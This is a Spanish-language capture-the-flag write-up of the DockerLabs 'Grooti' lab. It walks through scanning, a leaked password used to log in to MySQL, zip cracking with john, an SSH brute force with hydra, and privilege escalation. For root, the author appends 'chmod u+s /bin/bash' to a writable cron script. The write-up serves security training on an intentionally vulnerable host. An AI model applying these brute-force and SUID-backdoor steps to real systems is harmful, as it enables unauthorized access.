---
title: DockerLabs - Grooti
summary: "Write-up del laboratorio Grooti de DockerLabs"
author: elcybercurioso
date: 2025-11-11 21:20:21
categories: [Post, DockerLabs]
tags: [fácil, credentials leaking, private resource leaking, brute force, file permissions, ]
media_subpath: "/assets/img/posts/dockerlabs_grooti"
image:
  path: main.webp
published: true
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Grooti]
└─$ nmap -p- -sS --min-rate 5000 -v -n -Pn 172.17.0.2 -oG allPorts
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Grooti]
└─$ nmap -sCV -p22,80,3306 172.17.0.2
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 46:69:49:1a:d0:b7:26:05:90:a3:22:b2:a8:fe:fd:83 (ECDSA)
|_  256 91:67:c5:15:53:13:af:6f:28:7d:1e:77:46:0c:c1:bb (ED25519)
80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: \xF0\x9F\x8C\xB1 Grooti\'s Web
|_http-server-header: Apache/2.4.58 (Ubuntu)
3306/tcp open  mysql   MySQL 8.0.42-0ubuntu0.24.04.2
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=MySQL_Server_8.0.42_Auto_Generated_Server_Certificate
| Not valid before: 2025-07-18T22:37:08
|_Not valid after:  2035-07-16T22:37:08
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.42-0ubuntu0.24.04.2
|   Thread ID: 12
|   Capabilities flags: 65535
|   Some Capabilities: SupportsLoadDataLocal, SwitchToSSLAfterHandshake, IgnoreSpaceBeforeParenthesis, LongColumnFlag, ODBCClient, Support41Auth, FoundRows, Speaks41ProtocolNew, SupportsCompression, LongPassword, ConnectWithDatabase, IgnoreSigpipes, InteractiveClient, DontAllowDatabaseTableColumn, Speaks41ProtocolOld, SupportsTransactions, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: 3{}\x19LA8
| Y\x7F58@]\x13\x10ex8\x1F
|_  Auth Plugin Name: caching_sha2_password
```

## análisis

En la pantalla principal del servidor web encontramos varias funcionalidades:

![Desktop View](/20251110204358.webp){: width="972" height="589" .shadow}

Una de ellas nos lleva a un recurso que permite listar ficheros:

![Desktop View](/20251110204445.webp){: width="600" height="450" .shadow}

El fichero `README.md` contiene lo que podría tratarse de una contraseña, por lo que la guardamos para más adelante:

![Desktop View](/20251110204521.webp){: width="972" height="589" .shadow}

Otra de las funcionalidades de la página principal nos lleva a un panel con información, la cual posiblemente se extraiga de una base de datos:

![Desktop View](/20251110204733.webp){: width="972" height="589" .shadow}

Procedemos también a revisar los posibles recursos que existan en el servidor:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Grooti]
└─$ gobuster dir -u "http://172.17.0.2" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x .php,.html,.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/archives             (Status: 301) [Size: 311] [--> http://172.17.0.2/archives/]
/index.html           (Status: 200) [Size: 1436]
/imagenes             (Status: 301) [Size: 311] [--> http://172.17.0.2/imagenes/]
/secret               (Status: 301) [Size: 309] [--> http://172.17.0.2/secret/]
/server-status        (Status: 403) [Size: 275]
Progress: 882228 / 882228 (100.00%)
===============================================================
Finished
===============================================================
```

En el recurso `/secret` que hemos descubierto, vemos una lista de usuarios, sus permisos y si están o no activos:

![Desktop View](/20251110210543.webp){: width="972" height="589" .shadow}

Dado que en estos recursos no encontramos nada más relevante, volvemos a la pantalla principal, donde en el código fuente de la página hay un comentario que nos indica que posiblemente el usuario `rocket` sea un usuario válido para acceder al gestor de bases de datos de la máquina, el cual se encuentra disponible en el puerto **3306**:

![Desktop View](/20251110205738.webp){: width="600" height="370" .shadow}

Probamos a conectarnos con el usuario `rocket`, y la contraseña que encontramos previamente, y vemos que accedemos exitosamente:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Grooti]
└─$ mysql -u 'rocket' --password='p********' -h 172.17.0.2 --ssl=0
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 34
Server version: 8.0.42-0ubuntu0.24.04.2 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```

Una vez dentro, listamos las bases de datos existentes. La que parece más interesante de revisar es `files_secret`:

```bash
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| files_secret       |
| information_schema |
| performance_schema |
+--------------------+
3 rows in set (0.051 sec)
```

Listamos las tablas existentes en la base de datos `files_secret`, donde solo encontramos la tabla `rutas`:

```bash
MySQL [files_secret]> show tables;
+------------------------+
| Tables_in_files_secret |
+------------------------+
| rutas                  |
+------------------------+
1 row in set (0.003 sec)
```

Ahora, hacemos una consulta sobre la tabla `rutas`, donde las tres primeras son las que ya conocíamos, pero hay una cuarta:

```bash
MySQL [files_secret]> select * from rutas;
+----+------------+---------------------------------+
| id | nombre     | ruta                            |
+----+------------+---------------------------------+
|  1 | imagenes   | /var/www/html/files/imagenes/   |
|  2 | documentos | /var/www/html/files/documentos/ |
|  3 | facturas   | /var/www/html/files/facturas/   |
|  4 | secret     | /u********/s*****               |
+----+------------+---------------------------------+
4 rows in set (0.001 sec)
```

## acceso inicial (grooti)

Probamos a acceder a la cuarta, y vemos que se nos muestra un panel donde, tras rellenar un formulario y enviarlo, se nos generan y descargan ficheros automáticamente:

![Desktop View](/20251110211411.webp){: width="972" height="589" .shadow}

Vemos que si cambiamos el numero introducido y volvemos a enviar el formulario, nos devuelve un fichero con la frase indicada como contenido del mismo:

![Desktop View](/20251110211804.webp){: width="260" height="150" .shadow}

![Desktop View](/20251110211838.webp){: width="550" height="320" .shadow}

Para poder revisar todos los ficheros y quedarnos con lo que sea diferente, interceptamos la petición de envío del formulario con **Burp Suite**, y la enviamos al **Intruder**, indicando que lo que queremos que se modifique en cada iteración sea el campo del número introducido.

Pasado un rato, veremos que en cierta petición el tamaño de la respuesta será considerablemente superior al del resto de las peticiones:

![Desktop View](/20251110212154.webp){: width="972" height="589" .shadow}

Veremos que la respuesta no es legible:

![Desktop View](/20251110212221.webp){: width="972" height="589" .shadow}

Esto se debe a que lo que obtenemos en este caso será un fichero comprimido:

![Desktop View](/20251110212308.webp){: width="290" height="100" .shadow}

Al tratar de descomprimirlo, veremos que nos pide una clave:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Grooti]
└─$ 7z x password16.zip 
 
Enter password (will not be echoed):
ERROR: Wrong password : password16.txt
```

Dicha clave podemos llegar a obtenerla generando un hash con `zip2john`, guardarlo en un fichero, y pasar dicho fichero por una herramienta de fuerza bruta como `john` o `hashcat`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Grooti]
└─$ zip2john password16.zip > hash 
ver 2.0 efh 5455 efh 7875 password16.zip/password16.txt PKZIP Encr: TS_chk, cmplen=235, decmplen=327, crc=DEAD4CC8 ts=7EB3 cs=7eb3 type=8
                                                                                                                                                                                                                  
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Grooti]
└─$ john -w=/usr/share/seclists/Passwords/rockyou.txt hash
p********        (password16.zip/password16.txt)     
```

Una vez obtenida la clave, veremos que lograremos descomprimir el contenido del fichero .zip:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Grooti]
└─$ 7z x password16.zip

Enter password (will not be echoed):
Everything is Ok
```

Dicho fichero contendrá un listado de posibles contraseñas:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Grooti]
└─$ cat password16.txt
a*******
1*****
q*****
l******
r*******
1*******
p*******
s*********
i*******
h******
p*******
t******
c*******
a*********
w*******
t*******
a********
u*******
d*********
m*******
g********
G*******
!*********
m*********
Y********
P*******
m***********
Y***********
Y*********
f**********
1*******
b*********
r*******
h*******
```

Generamos también un listado de posibles usuarios con los datos obtenidos del recurso `/secret` del servidor:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Grooti]
└─$ cat users.txt                                                                                                                       
grooti
groot
rocket
naia
```

Tratamos de ver si algunas de las combinaciones de usuario y contraseña de los dos ficheros que hemos generado coinciden para acceder por SSH.

Pasado un rato, descubrimos que el usuario `grooti` y una de las contraseñas del fichero `password16.txt` son correctas como credenciales por SSH:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Grooti]
└─$ hydra -L users.txt -P password16.txt ssh://172.17.0.2 -t 64 -I

[DATA] max 64 tasks per 1 server, overall 64 tasks, 136 login tries (l:4/p:34), ~3 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: grooti   password: Y*********
```

Accedemos como el usuario `grooti`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Grooti]
└─$ ssh grooti@172.17.0.2                                             
grooti@172.17.0.2`s password: 
grooti@d56b68385918:~$ whoami
grooti
grooti@d56b68385918:~$ hostname -I
172.17.0.2
```

## escalada de privilegios (root)

Revisando los ficheros del sistema, encontramos que hay un script en la carpeta `/tmp`:

```bash
grooti@d56b68385918:~$ ls -la /tmp
total 16
drwxrwxrwt 1 root  root   4096 Nov 10 21:34 .
drwxr-xr-x 1 root  root   4096 Nov 10 20:24 ..
-rwxrw-r-- 1 root  grooti  221 Jul 22 21:07 malicious.sh
drwx------ 2 mysql mysql  4096 Jul 19 00:37 tmp.ngOCkV7Loy
```

El contenido del script es el siguiente, el cual se encarga de crear un fichero en `/tmp/mi_log_temporal.log`, y luego lo borra  dos segundos más tarde:

```bash
grooti@d56b68385918:~$ cat /tmp/malicious.sh
#!/bin/bash

LOG_TEMP="/tmp/mi_log_temporal.log"

echo "Log temporal creado a $(date)" > "$LOG_TEMP"
echo "Archivo $LOG_TEMP creado."

sleep 2

rm -f "$LOG_TEMP"
echo "Archivo $LOG_TEMP eliminado después de 2 segundos."
```

Procedemos a enviar el binario `pspy64` a la máquina, ya queremos revisar si hay procesos a nivel de sistema que se están ejecutando, como, por ejemplo, tareas cron.

Abrimos un servidor con `python3` donde tengamos el binario `pspy64` guardado:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Grooti]
└─$ python3 -m http.server 80                                                                                                                        
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Y desde la máquina víctima, lo descargamos con `wget`, y le damos permisos de ejecución:

```bash
grooti@d56b68385918:/tmp$ wget http://172.17.0.1/pspy64
--2025-11-10 21:38:14--  http://172.17.0.1/pspy64
Connecting to 172.17.0.1:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                                               100%[====================================================================================================================>]   2.96M  --.-KB/s    in 0.01s   

grooti@d56b68385918:/tmp$ chmod +x pspy64
```

Ejecutamos `pspy64`, y vemos que mediante una tarea cron, se está ejecutando el script que hemos visto antes:

```bash
grooti@d56b68385918:/tmp$ ./pspy64 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

20XX/XX/XX XX:XX:01 CMD: UID=0     PID=3424   | bash /tmp/malicious.sh 
20XX/XX/XX XX:XX:03 CMD: UID=0     PID=3462   | rm -f /tmp/mi_log_temporal.log
```

Comprobamos los permisos de dicho script, y vemos que el usuario `grooti` tiene permisos para editarlo:

```bash
grooti@d56b68385918:/tmp$ ls -la /tmp/malicious.sh
-rwxrw-r-- 1 root grooti 221 Jul 22 21:07 /tmp/malicious.sh
```

Por ello, lo que haremos será editarlo, indicando una instrucción que modifique los permisos del binario `/bin/bash`, que por defecto son los siguientes:

```bash
grooti@d56b68385918:/tmp$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Una vez hayamos editado el script, veremos que queda de la siguiente manera:

```bash
grooti@d56b68385918:/tmp$ cat /tmp/malicious.sh
#!/bin/bash

LOG_TEMP="/tmp/mi_log_temporal.log"

echo "Log temporal creado a $(date)" > "$LOG_TEMP"
echo "Archivo $LOG_TEMP creado."

sleep 2

rm -f "$LOG_TEMP"
echo "Archivo $LOG_TEMP eliminado después de 2 segundos."

chmod u+s /bin/bash
```

Después de un rato, si volvemos a revisar los permisos del binario `/bin/bash`, veremos que ahora tiene permisos SUID:

```bash
grooti@d56b68385918:/tmp$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Por lo tanto, podemos invocar una consola como el usuario `root`:

```bash
grooti@d56b68385918:/tmp$ bash -p
bash-5.2# whoami
root
```

Llegados a este punto, habremos completado el laboratorio con éxito!

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>